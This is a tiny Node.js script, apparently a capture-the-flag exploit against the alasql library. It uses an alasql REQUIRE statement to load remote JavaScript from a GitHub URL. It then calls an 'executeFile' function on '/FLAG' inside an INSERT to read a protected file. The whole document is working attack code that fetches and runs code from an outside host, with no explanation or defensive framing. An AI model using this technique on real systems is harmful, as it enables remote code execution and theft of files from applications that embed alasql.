const alasql = require('alasql');

alasql('REQUIRE "https://github.com/vr2/1/blob/main/flag.js"');

alasql('CREATE TABLE WOO (content TEXT)');

alasql('INSERT INTO WOO VALUES (executeFile("/FLAG"))');
